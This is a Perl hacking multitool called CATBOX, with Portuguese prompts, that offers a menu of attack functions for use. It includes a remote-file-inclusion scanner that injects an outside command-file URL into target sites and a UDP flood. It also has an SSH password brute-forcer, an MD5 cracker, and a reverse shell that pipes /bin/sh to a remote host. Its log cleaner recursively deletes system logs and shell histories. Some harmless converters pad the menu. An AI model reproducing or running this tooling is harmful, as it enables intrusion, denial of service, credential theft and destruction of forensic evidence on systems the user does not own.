#!/usr/bin/perl
########################################## Carrega Modulos
use Socket;
use IO::Socket;
use File::Find ();
use Digest::MD5 qw(md5_hex);
use IO::Socket::INET;
use LWP::UserAgent;
use LWP::Simple;
use Net::SSH;
########################################## Carrega limpador de tela e Banners de inicio
$sis="$^O"; header(); sleep 4;
if ($sis eq windows) { $cmd="cls"; } else { $cmd="clear"; }
inicio: print `$cmd`;header0();
########################################## CMD e Plugins
my $cmd="http://cooler.justfree.com/revistas/catbox_cmd.txt?";
my $cgi="cgi_plugin.txt";
########################################## Inicio Programa
my $valor=<STDIN>; chomp $valor;
if ($valor eq 1) {
print "You choice Googler-Hell-Scan\n";
print "vamos la, Qual string de busca \?\n"; my $string = <STDIN>; chomp $string;
print "Se nao quiser proxy coloque 0 \n"; print "Qual o proxy \? exemplo 200.1.2.0:8080 \n";
my $proxy = <STDIN>; chomp $proxy; my $cont=0; my $cont2=0; my $ua = new LWP::UserAgent;
$ua->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12) Gecko/20080301 Firefox/2.0.0.12');
if($proxy!=0) {$ua->env_proxy(); $ua->proxy("http", "http://$proxy/"); } print "Iniciando Busca... \n";
for(my $i=10;$i<200;$i+=2) {
my $pedido1 = new HTTP::Request GET =>"http://www.google.com/search?q=$string&start=$i";
my $resposta1 = $ua->request($pedido1) or die "Erro no site scanner\n"; my $res1 = $resposta1->content;
open (OUT, ">>hit.txt"); print OUT "$res1\n"; close(OUT); $cont=$cont+1;
while($res1 =~ m/<a href=\"http:\/\/([^>\"]*)\//g){
if ($1 !~ /64\..*\|\.google.*|\.orkut|.*\.google.*/){
my $links=$1; print "$links\n" ; open (OUT, ">>links.txt"); print OUT "$links\n"; close(OUT); $cont2=$cont2+1; }} }
print "Foi pego $cont2 links e $cont paginas pelo Search-Underground estao em links.txt\n"; exit;
sleep 8; goto inicio;
}

if ($valor eq 2) {
print "you choice number 2 Monkey RFI scan\n";
use warnings; use LWP::UserAgent;
print "qual nome do arquivo txt que contem as listas para scan \? \n";
my $lista = <STDIN>; chomp $lista;
open (my $injection, "<$lista.txt");
while (<$injection>) {
if ($_ =~ s/$\=.*/=$cmd/mg) {
open(LOG,">>sites.txt"); print LOG "$_"; close(LOG); }
}
print "pronto links separados e com CMD injetada\n";
close $injection; print "agora o scan vai procurar sites vulneraveis\n";
open (my $teste, "<sites.txt");
while (<$teste>) {
my $link4=$_;
$agent = new LWP::UserAgent;
$request = HTTP::Request->new('GET',$link4);
$result = $agent->request($request);
@result = $result->content();
open(RES,">","teste.txt");     
print RES @result; close(RES); open(RES,"<","teste.txt");
@rfi = <RES>; close(RES); unlink ("teste.txt");
foreach (@rfi) {
if ($_ =~ m/^echo \"<p>c4tb0x<\/p>\"\;$/) {
my $vuln=$link4; open (OUT, ">>rfi.txt"); print OUT "$vuln\n";
close(OUT); }}
}
close $teste; print "scan concluido salvo dados em rfi.txt\n\n";
sleep 8; goto inicio;
}

if ($valor eq 3) {
   print "You Choice 3 D00M CGI Scan \n";
   open (my $doom, "<$cgi");
   while (<$doom>) { my @bdvuln=$_; } close $doom;
   print "Qual o alvo \?\n"; my $alvo = <STDIN>; chomp $alvo;
   print "Se nao quiser proxy coloque 0 \n";
   print "Qual o proxy \? exemplo 200.1.2.0:8080 \n";
   my $proxy = <STDIN>; chomp $proxy; my $cont=0; my $ua = new LWP::UserAgent;
   $ua->agent('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.1.12)
   Gecko/20080301 Firefox/2.0.0.12');
if($proxy!=0) {$ua->env_proxy(); $ua->proxy("http", "http://$proxy/"); }
print "Iniciando Scan... \n";
for(my $i=0;$i<=$#doom;$i++) {
my $site="http://$alvo$doom[$i]";
my $pedido1 = new HTTP::Request GET => $site;
my $resposta1 = $ua->request($pedido1) or die "Erro no site\n";
if ($resposta1->is_success) {
open (OUT, ">>doom.txt"); print OUT "$site\n"; close(OUT);
$cont=$cont+1; print "$site\n"; } }
print "foi pego $cont vulnerabilidades pelo scan esta em doom.txt\n";
sleep 8; goto inicio;
}

if ($valor eq 4) {
       print "You Choice 4 Bind Scan\n";
       print "What you target\?\n";
       my $target=<STDIN>; chomp $target;
       my @bind=`dig \@$target version.bind CHAOS txt`;
  foreach (@bind) {
    if ($_ =~ /version.bind.*/) {
       print "$_"; }
  }
     print "Scan terminado\n"; sleep 3; goto inicio;
}

if ($valor eq 5) {
  &milworm(); sleep 5; goto inicio;
}

if ($valor eq 6) {
print "Sniper UDP Flood\n";
print "Qual he o alvo\?\n";
my $targets=<STDIN>; chomp $targets;
print "qual a porta\?\n";
my $portss=<STDIN>; chomp $portss;
print "Qual o tempo \?\n";
my $time=<STDIN>; chomp $time;
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$targets");
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 0, $size, sockaddr_in($portss, $iaddr)); }
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 65000) +1;
send(crazy, 0, $size, sockaddr_in($portss, $iaddr));}
sleep 8; goto inicio;
}

if ($valor eq 7) {
print "Escolha numero 7 Ninja Port Scan tcp";
print "qual he o alvo \?\n";
my $alvos=<STDIN>; chomp $alvos;
print "qual sao as portas \? ex: 80,21,22\n";
my $portas=<STDIN>; chomp $portas;
   my @array = split(/\,/,$portas); #organiza dados pegos e manda vetor
   foreach $portas (@array) {
   my $socket = IO::Socket::INET->new(PeerAddr => $alvos,
   PeerPort => $portas,
   Proto => 'tcp')
   or goto FIM;
   print "porta $portas Aberta \n";
   FIM: }
sleep 8; goto inicio;
}

if ($valor eq 8) {
print "Escolha numero 8 HULK ssh brute\n";
print "Qual he o host alvo\? \n";
my $host=<STDIN>; chomp $host;
print "Qual he o login \? \n";
my $user=<STDIN>; chomp $user;
print "qual o nome do dicionario ex lista.txt\n";
my $dicionario=<STDIN>; chomp $dicionario;
$i = 1;
open (D,"<$dicionario") or die "Dicinario nao encontrado\n";
while(<D>)
{
$try = $_;
    chomp $try;
        $t = my $ssh = Net::SSH::Perl->new($host,debug=>1,use_pty=>1);
        $ssh->login($user, $try);
print "================================\n";
print "[+] Esmagando e chutando o Pass\n";
                print $i++ . ": deu Erro - $try\n";

                print "'$try - $i tentativas";
                last;
        $t->close;
}
close(IN); sleep 8; goto inicio;
}


if ($valor eq 9) {
print "qual pagina voce quer ver info \?\n";
my $pagina=<STDIN>; chomp $pagina;
my $socket = IO::Socket::INET->new(
                                       PeerAddr => "$pagina",
                                       PeerPort => "80",
                                       Timeout => "7",
                                       Proto => "tcp"
  );
die "Nao foi possivel criar a socket\n" unless $socket;
if ($socket) {
print $socket "GET /index.html HTTP/1.0\r\n\r\n";
while (<$socket>) {
if ($_ =~ /Date:|Server:/){
print "$_"; }
}}
my $ip = inet_ntoa(inet_aton($pagina));
print "IP:$ip\n";
close($socket);
sleep 8; goto inicio;
}

if ($valor eq 10) {
print "voce escolheu log clean\n";
print `rm -rf /var/log`;
print `rm -rf /var/adm`;
print `rm -rf /var/apache/log`;
print `rm -rf $HISTFILE`;
print `find / -name .bash_history -exec rm -rf {} \;`;
print `find / -name .bash_logout -exec rm -rf {} \;`;
print `find / -name log* -exec rm -rf {} \;`;
print `find / -name *.log -exec rm -rf {} \;`;
print "logs limpos\n";
sleep 8; goto inicio;
}

if ($valor eq 11) {
print "MD5 crack\n";
print "Author: evolution0x55 \n";
print "Wordlist file? ";
chomp($file=<>);

open(FOPEN, $file) or die($file." not found!");

print "\nMD5 Hash? ";
chomp($hash=<>);
print "\n";

foreach (<FOPEN>){
    $line_hash=md5_hex($_);
    if ($line_hash eq $hash){
        print "CRACKED: ".$_;
        exit 0;
        }
    print $_.":".$hash." [FAILED]\n";
}

close(FOPEN);
print "\n\nHash not cracked."; exit;
sleep 8; goto inicio;
}

if ($valor eq 12) {
print "esta funcao requer wget\n";
print "qual pagina voce deseja baixar inteira baixa tudo mesmo\?\n";
my $sitee=<STDIN>; chomp $sitee;
print `wget -crp http://$sitee`;
print "pronto\n"; sleep 8; goto inicio;
}

if ($valor eq 13) {
print "..::Conect-DooR::.. \n digite o host\n";
$host33=<STDIN>; chomp $host33;
print "digite a porta\n"; $port33=<STDIN>; chomp $port33;
print "Passando info\ntentando conectar...\n";
$proto = getprotobyname('tcp') || die("Unknown Protocol\n");
socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("Socket Error\n");
my $target = inet_aton($host33);
if (!connect(SERVER, pack "SnA4x8", 2, $port33, $target)) {
  die("Nao foi possivel conectar\n");
}
print "Conectando...\n";
if (!fork( )) {
  open(STDIN,">&SERVER");
  open(STDOUT,">&SERVER");
  open(STDERR,">&SERVER");
  exec {'/bin/sh'} '-bash' . "\0" x 4;
  exit(0);
}
print "frusted\n";
sleep 8; goto inicio;
}

if ($valor eq 14) {
print "pegando temperatura Brasil by C00L3R\n";
print "qual estato voce quer ver a temperatura\? ex sao_paulo\n";
my $local=<STDIN>; chomp $local;
my $pagina="http://www1.folha.uol.com.br/folha/tempo/br-$local.shtml";
$agent = new LWP::UserAgent;
$request = HTTP::Request->new('GET',$pagina);
$result = $agent->request($request);
@result = $result->content();
open(RES,">","temperatura.txt");
print RES @result; close(RES); open(RES,"<","temperatura.txt");
@texto = <RES>; close(RES); unlink ("temperatura.txt");
foreach (@texto) {
if ($_ =~ m/^<p><b>Temperatura:<\/b> (.*?)<\/p>/) {
my $graus="$1";
print "Local: $local \n";
print "Temperatura: $graus\n"; }}
sleep 8; goto inicio;
}
if ($valor eq 15) {
print "pegando ultimos posts do blog botecounix.serveftp.com\n";
my $pagina="http://cooler.justfree.com/boteco/?feed=rss2";
$agent = new LWP::UserAgent;
$request = HTTP::Request->new('GET',$pagina);
$result = $agent->request($request);
@result = $result->content();
open(RES,">","novi.txt");
print RES @result; close(RES); open(RES,"<","novi.txt");
@texto = <RES>; close(RES); unlink ("novi.txt");
foreach (@texto) {
if ($_ =~ m/<(title|link)>(.*?)<\/(title|link)>/) {
my $nova="$2";
print "$nova\n"; }}
sleep 8; goto inicio;
}

if ($valor eq 16) {
print "converter ASCII para numero\ndigite um digito\n";
my $char=<STDIN>; chomp $char;
my $num = ord($char); eval print "resultado:$num\n";
sleep 8; goto inicio;
}

if ($valor eq 17) {
print "converter numero para ASCII\ndigite um numero\n";
my $num=<STDIN>; chomp $num;
$char = chr($num); eval print "resultado:$char\n";
sleep 8; goto inicio;
}

if ($valor eq 18) {
print "converter decimal para binario\ndigite um decimal\n";
$decimal=<STDIN>; chomp $decimal;
$bin = dec2bin($decimal); eval print "binario:$bin\n";
sleep 8; goto inicio;
}

if ($valor eq 19) {
print "converter binario para decimal\ndigite um binario\n";
$binario=<STDIN>; chomp $binario;
$deci = bin2dec('$binario'); eval print "decimal:$deci\n";
sleep 8; goto inicio;
}

if ($valor eq 20) {
print "converter octal para hexadecimal\ndigite um numero octal\n";
$oc=<STDIN>; chomp $oc; $hexx = hex($oc); eval print
"hexadecimal:$hexx\n";
sleep 8; goto inicio;
}

if ($valor eq 21) {
print "converter hexadecimal para octal\ndigite um hexadecimal\n";
$hex=<STDIN>; chomp $hex; $octa = oct($hex);eval print "octal:$octa";
sleep 8; goto inicio;
}

if ($valor eq 22) {
print "Qual he o arquivo \? \n";
my $camelo=<STDIN>; chomp $camelo;
open (my $removendo, "<$camelo");
while (<$removendo>) {
if ($_ =~ s/^#.*//mg) { } elsif ($_ =~ /.*/) {
open(LOG,">>sem_coment.txt"); print LOG "$_"; close(LOG);} }
print "pronto arquivo salvo em sem_comentario.txt\n";
sleep 8; goto inicio;
}

if ($valor eq 23) {
print "de o nome do programa a ser morto\n";
$next=<STDIN>; chomp $next;
@proces=`ps aux`; foreach (@proces) {
if($_ =~ /$next/) {  if($_ =~ /^[A-Za-z]+\s+(\d{1,5})/) {
`kill $1`; eval print "processo morto\n$_\npid:$1\n"; print "$_\n"; }}}
sleep 8; goto inicio;
}

if ($valor eq 24) {
print "Qual pasta deseja verificar\?\n";
$pasta=<STDIN>; chomp $pasta;
use vars qw/*name *dir *prune/;
*name   = *File::Find::name;
*dir    = *File::Find::dir;
*prune  = *File::Find::prune;
File::Find::find({wanted => \&wanted}, $pasta);
sleep 8; goto inicio;
}

if ($valor eq 25) {
headerx(); sleep 8; goto inicio;
}

sub milworm() {
@sploits = (); $version = 1.0; $getit = 'http://milw0rm.com/rss.php';
$agent = new LWP::UserAgent; $request = HTTP::Request->new('GET',$getit);
$result = $agent->request($request); $getit =~ s/.*\///;
@result = $result->content(); open(RES,">","mille.txt");
print RES @result; close(RES); open(RES,"<","mille.txt");
@inhalt = <RES>; close(RES); unlink ("mille.txt");
foreach $shit (@inhalt) { $shit =~ tr/</ /; $shit =~ tr/>/ /;
$shit =~ tr/\// /; $shit =~ s/milw0rm.com//ig;
if ($shit =~ m/title/i) { $shit =~ s/title/ /ig; push(@sploits,"$shit");
} } print @sploits; }

sub wanted {
if (-l $_) { my @stat = stat($_);
if ($#stat == -1) {  print "link ruin: $name\n"; }}
}

sub header() {
print q{
                           ,,;;iiiiii;;,,..                         
                      ;;jjGGDDDDDDDDDDDDDDGGjj;;                     
                  ;;GGDDDDDDDDDDDDDDDDDDDDDDDDDDGGii                 
              ,,LLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLL,,             
            ;;DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD;;           
          iiDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDii         
        ;;DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD;;       
      ,,DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD,,     
      LLDDDDDDDDDDDDDDDDDDDDLLii;;iiii;;;;iittjjGGDDDDDDDDDDDDLL     
    ;;DDDDDDDDDDDDDDDDDDtt,,;;jjGGjj;;            ,,iijjDDDDDDDDii   
    GGDDDDDDGGjjttii;;..,,LLLLtt,,              ;;,,      ;;jjDDGG   
  ;;DDLLii,,                                      iitt,,,,;;ttDDDD;; 
  jjDD;;                                            ..;;;;;;,,iiDDjj 
  GGDDjj                                                      ,,DDGG 
,,DDDDii            ....                        ..            ..DDDD,,
;;DDDDii      ;;ffDDDDDDDDGGjj,,                ..ii            GGDD;;
iiDDDDLL    iiDDDDDDDDDDDDDDDDDDii                ;;::          GGDDii
iiDDDDDD;;..GGDDDDDDDDDDDDDDDDDDGG                ..tt        ..DDDDii
iiDDDDDDtt,,DDDDDDDDDDDDDDDDDDDDDD..                LL        ,,DDDDii
;;DDDDDDLL..DDDDDDDDDDDDDDDDDDDDDD                  GG        iiDDDD;;
,,DDDDDDDD;;LLDDDDDDDDDDDDDDDDDDjj                ,,LL        ffDDDD,,
..GGDDDDDDGGjjDDDDDDDDDDDDDDDDGG..                jjii      ..DDDDGG..
  jjDDDDDDDDDDDDDDDDDDDDDDDDGG,,                ttjj        ttDDDDjj 
  ;;DDDDDDDDDDDDDDDDDDDDDDGG,,              ..ttGG..      ,,DDDDDD;; 
    GGDDDDDDDDDDiittjjjjii..      ;;ttttttffDDDDDDDD;;    LLDDDDGG   
    iiDDDDDDDDDDLL            ,,LLDDDDDDDDDDDDDDDDDDGG..ttDDDDDDii   
      LLDDDDDDDDDD..          jjDDDDDDDDDDDDDDDDDDDDDDjjDDDDDDLL     
      ,,DDDDDDDDDDGG;;        ,,ttLLDDDDDDDDDDDDDDDDDDDDDDDDDD,,     
        ;;DDDDDDDDDDDDff;;....,,ttDDDDDDDDDDDDDDDDDDDDDDDDDDii       
          iiDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDii         
            ;;DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDii           
              ,,LLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLL,,             
                  iiGGDDDDDDDDDDDDDDDDDDDDDDDDDDGGii                 
                      ;;jjGGDDDDDDDDDDDDDDGGjj;;                     
                            ,,;;iiiiii;;,,..       
}
}

sub header0() {
print q{               
_______________________________
|--===========*****===========--|
|      -=CATBOX=- v0.2          |
|===============================|
|          L05T-C0D3R5          |
|===============================|
|-------------------------------|
|0-Sair do CATBOX               |
|1-Googler-Hell-Scan v0.4       |
|2-Catbox-RFI+triad v1.0        |
|3-D00M-CGI-Scan-v0.3           |
|4-Bind-Scan                    |
|5-Milw0rm-News                 |
|6-Sniper-Datagrama-Flood       |
|7-Ninja-TCP-Port-Scan          |
|8-HULK-SSH-BRUTE  0.4          |
|9-Host-Info-Scan  0.2          |
|10-Log-Cleaner 0.1             |
|11-MD5-crack-hex               |
|12-Down-all-wget               |
|13-Conect-Door-beta            |
|14-Temperatura-Local           |
|15-Novidades do BotecoUnix     |
|16-ASCII para Numero           |
|17-Numero para ASCII           |
|18-Decimal para binario        |
|19-Binario para decimal        |
|20-Octal para hexadecimal      |
|21-Hexadecimal para Octal      |
|22-Apaga coments de configs    |
|23-Mata Processo pelo nome     |
|24-Acha links symbolicos ruins |
|25-Creditos                    |
|-------------------------------|
|        Priv8 EditioN          |
|      Escolha um numero        |
|===============================|
\\___________________________//     
}
}


sub headerx() {
print q{
-----------------------------
  use este programa
  com o term 800x600
-----------------------------
    CATBOX Real Knife tool
_____________________________
      MADE IN BRASIL
=============================
   Thanks
=============================
         b4rtb0y
     _Mlk_
   voidpointer
=================================
visite meu blog
=================================
botecounix.com.br
=================================
email: tony.unix@yahoo.com.br
--------------------------------     
   CATBOX- coded by C00L3R_
--------------------------------
}
}
